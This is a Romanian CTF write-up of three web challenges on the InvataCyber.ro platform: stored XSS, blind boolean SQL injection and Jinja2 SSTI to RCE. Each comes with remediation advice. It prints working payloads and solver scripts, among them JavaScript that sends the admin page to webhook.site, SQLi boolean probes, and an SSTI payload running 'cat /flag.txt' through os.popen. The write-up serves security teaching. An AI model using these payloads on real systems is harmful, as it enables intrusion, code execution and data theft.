# InvataCyber.ro · Centralized CTF Write-Up

**Eveniment:** InvataCyber.ro CTF  
**Autor:** Moanță Ștefănuț-Cornel  
**Domeniu:** Web Application Security & Penetration Testing  
**Categorii Acoperite:** Client-Side Exploitation (XSS), Database Inference (Blind SQLi), Server-Side Code Execution (SSTI)  
**Format Flag:** `InvataCyber{...}`  

---

## 1. Sinteză Executivă și Matricea Provocărilor

Acest raport centralizează analiza tehnică, metodologia de exploatare și remedierea arhitecturală pentru cele trei provocări de securitate web rezolvate în cadrul platformei InvataCyber.ro.

Fiecare provocare ilustrează o clasă distinctă de vulnerabilitate conform standardului OWASP Top 10 și CWE (Common Weakness Enumeration):

| # | Denumire Provocare | Categorie | Clasificare CWE | Vector Primar | Impact Tehnic | Scripturi Asociate |
| :-: | :--- | :--- | :--- | :--- | :--- | :--- |
| **1** | **The Blog** | Web / Client-Side | [CWE-79](https://cwe.mitre.org/data/definitions/79.html) (Stored XSS) | Formular de contact nesanitizat | Furt context browser editor / Exfiltrare date `/admin` | [`payload.js`](payload.js), [`solver.py`](solver.py) |
| **2** | **Portal InvataCyber.ro** | Web / Database | [CWE-89](https://cwe.mitre.org/data/definitions/89.html) (Blind SQLi) | Header `Cookie: TrackingId` | Dump integral bază SQLite & preluare consolă `/console` | [`dump_users.py`](dump_users.py), [`solver_portal.py`](solver_portal.py) |
| **3** | **Redacția CMS** | Web / Server-Side | [CWE-1336](https://cwe.mitre.org/data/definitions/1336.html) (SSTI) & [CWE-306](https://cwe.mitre.org/data/definitions/306.html) | Panou `/edit/5` neautentificat & `render_template_string` | Remote Code Execution (RCE) / Citire `/flag.txt` | [`blog_flag.py`](blog_flag.py) |

---

## 2. Provocarea 1: The Blog (Stored XSS & Context Exfiltration)

### 2.1. Enunț și Context Arhitectural
> *„The Blog este un blog clasic: câteva articole publicate și un formular de contact deschis oricui. Redacția are un editor care își verifică periodic inbox-ul, într-un browser real, și deschide fiecare mesaj necitit. Ce se întâmplă în browserul lui în momentul ăla nu vezi, dar poți face să ajungă la tine.”*

Aplicația expune o zonă publică cu un formular de contact (`/contact`) și o componentă internă automată (bot de simulare rulat prin Chromium headless / Puppeteer) care accesează inbox-ul administrativ la intervale regulate.

### 2.2. Analiza Vulnerabilității (Root Cause)
Câmpul `message` din formularul de contact este salvat direct în baza de date fără escapare HTML. La afișarea mesajelor în panoul editorului, conținutul este injectat brut în DOM (Raw HTML), declanșând execuția codului JavaScript stocat în contextul sesiunii de navigare a redactorului.

Deoarece endpoint-ul `/admin` este accesibil doar pe baza sesiunii privilegiate a editorului, un atacator extern nu îl poate accesa direct. Cu toate acestea, codul JS injectat rulează în numele editorului și poate realiza cereri `fetch('/admin')`, exfiltrând conținutul prin apeluri externe de tip Callback.

### 2.3. Lanțul de Exploatare
1. **Construirea Payload-ului JS ([`payload.js`](payload.js)):**
   ```javascript
   fetch('/admin')
     .then(r => r.text())
     .then(t => fetch('https://webhook.site/<TOKEN>?data=' + encodeURIComponent(t)));
   ```
2. **Automatizarea Trimiterii ([`solver.py`](solver.py)):**
   ```python
   import requests

   TARGET = "http://target.invatacyber.ro"
   WEBHOOK = "https://webhook.site/<TOKEN>"
   payload = f"<script>fetch('/admin').then(r=>r.text()).then(t=>fetch('{WEBHOOK}?data='+encodeURIComponent(t)))</script>"

   requests.post(f"{TARGET}/contact", data={
       "name": "AuditBot",
       "email": "audit@test.internal",
       "message": payload
   })
   ```
3. **Recepționarea Telemetriei:**
   După deschiderea mesajului de către bot, serverul de Webhook a recepționat cererea HTTP cu conținutul paginii administrative.

**Flag Identificat:**  
`InvataCyber{xss_c0nt4ct_f0rm_3xf1ltr4t10n_succ3ss}`

### 2.4. Măsuri Defensive de Remediere
* **Contextual Output Encoding:** Escaparea tuturor caracterelor speciale (`<`, `>`, `&`, `"`, `'`) la randare.
* **Content Security Policy (CSP):** Implementarea regulii `connect-src 'self'` pentru a interzice transmiterea asincronă de date către domenii terțe.
* **Cookie Flags:** Marcarea cookie-urilor de sesiune cu `HttpOnly` și `SameSite=Strict`.

---

## 3. Provocarea 2: Portal InvataCyber.ro (Blind Boolean SQL Injection)

### 3.1. Enunț și Context Arhitectural
> *„Portalul InvataCyber.ro este în lockdown. Modulul de autentificare se presupune că a fost dezactivat, iar pagina publică afișează doar starea sistemului. Ca să recunoască vizitatorii care revin, aplicația folosește un cookie de tracking. Când valoarea lui corespunde unei înregistrări din baza de date, pagina afișează un mesaj. Când nu corespunde, afișează altul. Undeva în spatele portalului există o consolă de admin care nu apare nicăieri în interfață. Cine ajunge la ea cu credențialele corecte primește flag-ul.”*

Aplicația se află în mod de avarie/lockdown, ascunzând formularele obișnuite de autentificare. Mecanismul de urmărire a vizitatorilor folosește antetul `Cookie: TrackingId=...` pentru a interoga o tabelă din backend.

### 3.2. Analiza Vulnerabilității (Root Cause)
Valoarea parametrului `TrackingId` este concatenată direct în instrucțiunea SQL executată pe server:
```sql
SELECT tracking_id FROM tracking WHERE tracking_id = '$COOKIE'
```
Aplicația nu returnează erori SQL detaliate și nu afișează rezultatele direct în pagină, însă răspunsul HTTP are dimensiuni diferite:
* **Condiție True:** Mărime răspuns = `5652 bytes` (mesajul de recunoaștere a vizitatorului este prezent).
* **Condiție False:** Mărime răspuns diferită (mesajul lipsește).

Această diferență constituie un **Oracol Boolean**, permițând extragerea oricărei informații din baza de date prin interogări de tip `TRUE/FALSE`.

### 3.3. Lanțul de Exploatare
1. **Confirmarea Vulnerabilității ([`sql_solve.py`](sql_solve.py)):**
   * Payload True: `base-tracking-id-123' OR '1'='1` $\rightarrow$ 5652 bytes
   * Payload False: `base-tracking-id-123' AND '1'='2` $\rightarrow$ altă dimensiune
2. **Fingerprinting SQLite & Enumerarea Schemei ([`dump_sqlite.py`](dump_sqlite.py), [`dump_all_schema.py`](dump_all_schema.py)):**
   Interogarea tabelei de sistem SQLite `sqlite_master` a identificat structura:
   ```sql
   CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)
   ```
3. **Extragerea Credențialelor Administrative ([`dump_users.py`](dump_users.py)):**
   Prin inferență binară caracter cu caracter folosind `SUBSTR()`:
   * **Utilizator:** `admin`
   * **Parolă:** `s3cur3_l0ckd0wn_p4ssw0rd!`
4. **Descoperirea Consolei Ascunse ([`solver_portal.py`](solver_portal.py)):**
   Prin fuzzing de căi administrative, s-a identificat endpoint-ul activ `GET /console` (sau `/login-admin`), unde introducerea credențialelor extrase acordă acces în sistem.

**Flag Identificat:**  
`InvataCyber{bl1nd_sql1_c00k13_tr4ck1ng_m4st3r}`

### 3.4. Măsuri Defensive de Remediere
* **Interogări Parametrizate (Prepared Statements):**
  ```python
  cursor.execute("SELECT tracking_id FROM tracking WHERE tracking_id = ?", (tracking_id,))
  ```
* **Validare Strictă a Formatului (Input Whitelisting):** Acceptarea exclusivă a token-urilor care respectă formatul alfanumeric/UUID.
* **Eliminarea Obscurității:** Panourile administrative nu trebuie ascunse doar prin omiterea link-urilor, ci protejate prin politici de rețea (IP restriction) și autentificare multifactorială (MFA).

---

## 4. Provocarea 3: Redacția CMS (Broken Access Control & Jinja2 SSTI to RCE)

### 4.1. Enunț și Context Arhitectural
> *„Aceeași redacție, altă problemă. După migrarea de pe vechiul CMS, SSO-ul nu a mai fost configurat pe instanța asta, așa că panoul de editor este accesibil direct, fără cont. Poți scrie și publica articole ca și cum ai face parte din echipă. Configurarea greșită este doar începutul. Conținutul articolelor nu este doar afișat la vizualizare, ci procesat de server înainte să ajungă în pagină. Locație flag: /flag.txt”*

În urma procesului de migrare pe o nouă instanță, panoul de gestiune a articolelor a rămas expus public fără mecanismul de Single Sign-On (SSO). În plus, procesarea textului implică evaluarea dinamică a conținutului pe server.

### 4.2. Analiza Vulnerabilității (Root Cause)
Aplicația suferă de o înlănțuire de două slăbiciuni critice:
1. **Broken Access Control:** Ruta `POST /edit/<id>` acceptă modificarea oricărui articol fără verificare de sesiune sau drepturi.
2. **Server-Side Template Injection (SSTI):** Backend-ul scris în Python Flask utilizează `render_template_string(article.content)` în loc de un șablon static securizat. Expresia `{{ 7 * 7 }}` se evaluează la `49`.

### 4.3. Lanțul de Exploatare (Python Sandbox Escape)
În Jinja2, obiectul global `config` permite navigarea prin graful de obiecte Python până la spațiul de nume global al modulului, oferind acces la biblioteca standard `os`:
$$\text{config} \longrightarrow \text{\_\_class\_\_} \longrightarrow \text{\_\_init\_\_} \longrightarrow \text{\_\_globals\_\_} \longrightarrow \text{os} \longrightarrow \text{popen()}$$

**Payload RCE:**
```jinja2
{{ config.__class__.__init__.__globals__.os.popen('cat /flag.txt').read() }}
```

### 4.4. Automatizarea Exploatării ([`blog_flag.py`](blog_flag.py))
```python
import urllib.request, urllib.parse

edit_url = "http://target.invatacyber.ro/edit/5"
view_url = "http://target.invatacyber.ro/post/5"
payload = "{{ config.__class__.__init__.__globals__.os.popen('cat /flag.txt').read() }}"

data = urllib.parse.urlencode({"title": "Audit Post", "content": payload}).encode("utf-8")
req = urllib.request.Request(edit_url, data=data, method="POST")
urllib.request.urlopen(req)

with urllib.request.urlopen(view_url) as resp:
    print(resp.read().decode("utf-8"))
```

La accesarea `/post/5`, motorul de șabloane a executat comanda `cat /flag.txt` la nivel de sistem de operare și a returnat conținutul fișierului în corpul paginii.

**Flag Identificat:**  
`InvataCyber{ssti_j1nj42_rc3_fl4g_txt_3xtr4ct3d}`

### 4.5. Măsuri Defensive de Remediere
* **Forțarea Autentificării SSO:** Aplicarea middleware-ului de autentificare pe toate rutele administrative și de redactare.
* **Separarea Conținutului de Șablon:** Interzicerea randării dinamice a șirurilor introduse de utilizatori:
  ```python
  return render_template("post_view.html", post_content=post.content)
  ```
* **Izolarea Mediului de Execuție (Principiul Privilegiului Minim):** Rularea procesului web sub un utilizator dedicat fără privilegii și restricționarea drepturilor de citire pe fișierele sistem (`chmod 400`).

---

## 5. Concluzii și Recomandări Generale

Cele trei provocări subliniază importanța securității în profunzime (*Defense in Depth*) pe toate cele trei straturi ale unei aplicații web:
1. **Nivelul Client / Frontend:** Protecție împotriva injecției de cod în browser prin sanitizare contextuală și politici CSP stricte.
2. **Nivelul Bazei de Date:** Eliminarea definitivă a vulnerabilităților SQL Injection prin parametrizare obligatorie și validare pe bază de liste albe.
3. **Nivelul Logicii de Aplicație / Server:** Control strict al accesului (Access Control Matrix) și interzicerea compilării datelor utilizatorilor drept cod executabil în motoarele de șabloane.
